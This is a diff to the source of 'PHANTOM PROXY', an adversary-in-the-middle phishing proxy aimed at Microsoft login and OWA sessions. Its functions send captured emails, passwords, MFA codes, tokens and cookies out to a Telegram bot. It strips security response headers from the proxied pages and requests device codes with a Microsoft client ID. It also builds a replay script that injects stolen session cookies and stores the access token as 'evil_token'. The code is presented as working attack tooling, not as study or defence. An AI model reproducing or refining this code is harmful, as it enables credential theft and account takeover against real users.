@@ -1,11 +1,8 @@
-```javascript
 // ============================================================
-// 🥔 PHANTOM PROXY v11.35 — FULL FIXED VERSION
+// 🥔 PHANTOM PROXY v11.35 — FULL FIX FOR GET DEST + REAL OWA BYPASS
 // ============================================================
 // Includes: global rewriteUrl, redirect headers, SW, HTML/JS rewrite,
 // GET dest param parsing, device/prt/vault, and replay injection.
-// FIXES: encryption key length, set-cookie retention, axios checks,
-// cookie expiry NaN handling, path replacement, replay domain.
 // ============================================================
 
 const http = require("http");
@@ -48,10 +45,7 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
-// FIXED: Store key as 32-byte buffer, not hex string
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY 
-    ? Buffer.from(process.env.ENCRYPTION_KEY, 'hex') 
-    : crypto.randomBytes(32);
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
 const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
 const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
 const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
@@ -250,7 +244,6 @@ function addCORSHeaders(headers) {
 
 // ── Telegram functions ──
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
-    if (!axios) return; // FIXED: check axios availability
     const validTokens = Object.fromEntries(Object.entries(tokens).filter(([_, v]) => v && typeof v === 'string'));
     if (Object.keys(validTokens).length === 0 || !FormData) return;
     try {
@@ -272,7 +265,6 @@ async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
 }
 
 async function sendCookiesFile(cookies, sessionId) {
-    if (!axios) return; // FIXED
     if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
     try {
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
@@ -292,7 +284,7 @@ async function sendCookiesFile(cookies, sessionId) {
 }
 
 async function sendToTelegram(data, type = 'capture', ip = null, options = {}) {
-    if (!axios) { console.warn('axios not available, skipping Telegram'); return; } // FIXED
+    if (!axios) throw new Error('axios not available');
     const { skipFile = false } = options;
     try {
         const sessionId = data.sessionId || 'unknown';
@@ -350,11 +342,10 @@ async function sendToTelegram(data, type = 'capture', ip = null, options = {}) {
                 disable_web_page_preview: true
             }, { timeout: 5000 });
         }
-    } catch (e) { console.error(`❌ Telegram send failed:`, e.message); }
+    } catch (e) { console.error(`❌ Telegram send failed:`, e.message); throw e; }
 }
 
 async function sendVisitNotification(req, sessionId, ip) {
-    if (!axios) return; // FIXED
     try {
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const url = req.url || '/';
@@ -426,10 +417,8 @@ function displayError(message, error, ...args) {
 
 async function encryptData(data) {
     const iv = crypto.randomBytes(16);
-    // FIXED: use Buffer.from for key
-    const key = ENCRYPTION_KEY; // already a Buffer
     return new Promise((resolve, reject) => {
-        const cipher = crypto.createCipheriv("aes-256-ctr", key, iv);
+        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
         const encryptedData = [];
         cipher.on("error", reject)
               .on("data", chunk => encryptedData.push(chunk))
@@ -578,10 +567,6 @@ function updateCurrentSessionCookies(request, newCookies, proxyHostname, current
         if (!isValid) continue;
         cookieExpires += clockSkew;
         if (cookieMaxAge) { const sec = parseInt(cookieMaxAge); if (!isNaN(sec)) cookieExpires = now + sec * 1000; }
-        // FIXED: if cookieExpires is NaN, set to 1 day from now
-        if (isNaN(cookieExpires)) {
-            cookieExpires = now + 86400000; // 1 day
-        }
         let isNew = true;
         const sessionCookies = session.cookies;
         for (let i = 0; i < sessionCookies.length; i++) {
@@ -633,10 +618,9 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
 }
 
 function deleteHTTPSecurityResponseHeaders(headers) {
-    const secHeaders = ["x-frame-options","x-xss-protection","x-content-type-options",
+    const secHeaders = ["x-frame-options","x-xss-protection","x-content-type-options","set-cookie",
         "content-security-policy","content-security-policy-report-only","cross-origin-opener-policy",
         "cross-origin-embedder-policy","cross-origin-resource-policy","permissions-policy","service-worker-allowed"];
-    // FIXED: removed "set-cookie" from deletion
     for (const h of secHeaders) delete headers[h];
 }
 
@@ -1115,7 +1099,7 @@ if (!fs.existsSync(swFilePath)) fs.writeFileSync(swFilePath, serviceWorkerCode);
 class TokenVault {
     constructor(logsDir, encryptionKey) {
         this.logsDir = logsDir;
-        this.encryptionKey = encryptionKey; // Buffer
+        this.encryptionKey = encryptionKey;
         this.tokens = [];
         this.scanLogs();
     }
@@ -1141,7 +1125,6 @@ class TokenVault {
                         const entry = JSON.parse(line);
                         const iv = Object.keys(entry)[0];
                         const encrypted = entry[iv];
-                        // FIXED: use Buffer key
                         const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, Buffer.from(iv, 'hex'));
                         let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                         decrypted = Buffer.concat([decrypted, decipher.final()]);
@@ -1508,11 +1491,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
     if (apiPath === '/api/test-telegram') {
-        if (!axios) {
-            res.writeHead(500, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ error: 'axios not available' }));
-            return;
-        }
         try {
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
@@ -1626,11 +1604,6 @@ async function handleDashboardAPI(req, res) {
     }
     // Device Code (dashboard)
     if (apiPath === '/api/device/request' && req.method === 'POST') {
-        if (!axios) {
-            res.writeHead(500, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ error: 'axios not installed' }));
-            return;
-        }
         try {
             const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
             const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
@@ -2101,8 +2074,7 @@ async function handleDashboardAPI(req, res) {
                 return;
             }
 
-            // FIXED: use the extracted targetDomain for redirect
-            const redirectDomain = targetDomain || 'login.microsoftonline.com';
+            const redirectDomain = 'login.microsoftonline.com';
             const replayScript = `(function(){const cookies=${JSON.stringify(allCookies)};const targetDomain=${JSON.stringify(targetDomain||'login.microsoftonline.com')};cookies.forEach(c=>{document.cookie=c+'; path=/; domain='+targetDomain+'; Secure; SameSite=None'});let msg='🍪 '+cookies.length+' cookies injected.';const accessToken=${JSON.stringify(accessToken)};if(accessToken){msg+='\\n🔑 Access token: '+accessToken.slice(0,20)+'...';localStorage.setItem('evil_token',accessToken)}const refreshToken=${JSON.stringify(refreshToken)};if(refreshToken){msg+='\\n🔄 Refresh token: '+refreshToken.slice(0,20)+'...'}alert(msg);window.location.href='https://${redirectDomain}';})();`;
 
             res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -2287,11 +2259,6 @@ const server = http.createServer(async (req, res) => {
         const { method, url } = req;
 
         if (url === '/test-telegram-now') {
-            if (!axios) {
-                res.writeHead(500, { 'Content-Type': 'text/plain' });
-                res.end('axios not installed');
-                return;
-            }
             try {
                 const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: CHAT_ID,
@@ -2617,7 +2584,6 @@ const server = http.createServer(async (req, res) => {
                         hostname: VICTIM_SESSIONS[currentSession].hostname,
                         port: VICTIM_SESSIONS[currentSession].port,
                         method: method,
-                        // FIXED: use session's stored path directly (no replaceAll)
                         path: VICTIM_SESSIONS[currentSession].path,
                         headers: { ...headers },
                         rejectUnauthorized: false
@@ -2710,8 +2676,7 @@ const server = http.createServer(async (req, res) => {
                         console.warn(`No request body for URL: ${url}`);
                     }
 
-                    // FIXED: removed the replaceAll on path; we use session.path directly
-                    // updateProxyRequestHeaders also rewrites host in headers but not path
+                    proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                     updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
 
                     const proxyRequestBody = clientRequestBody.body || clientRequestBody;
@@ -3116,12 +3081,10 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`🔌 WebSocket: /ws (live log updates, heartbeat)`);
     console.log(`🧹 Session TTL: ${SESSION_TTL/60000} minutes`);
     console.log(`📁 Max open log streams: ${MAX_OPEN_STREAMS}`);
-    console.log(`🔧 FIXED: Encryption key now stored as 32-byte Buffer, not hex string.`);
-    console.log(`🔧 FIXED: set-cookie header no longer deleted (critical for session persistence).`);
-    console.log(`🔧 FIXED: axios null checks added to all Telegram functions.`);
-    console.log(`🔧 FIXED: NaN expiry in cookies now set to 1 day default.`);
-    console.log(`🔧 FIXED: path.replaceAll removed; session.path used directly.`);
-    console.log(`🔧 FIXED: replay script uses extracted targetDomain for redirect.`);
+    console.log(`🔧 FIXED: Global rewriteUrl applied to redirects, HTML, client JS, and SW.`);
+    console.log(`🔧 FIXED: Client window.location overrides added.`);
+    console.log(`🔧 FIXED: GET /gateway/...?dest=... now correctly updates session target.`);
+    console.log(`🔧 FIXED: Replay endpoint returns exact Set-Cookie strings for real OWA bypass.`);
 
     if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
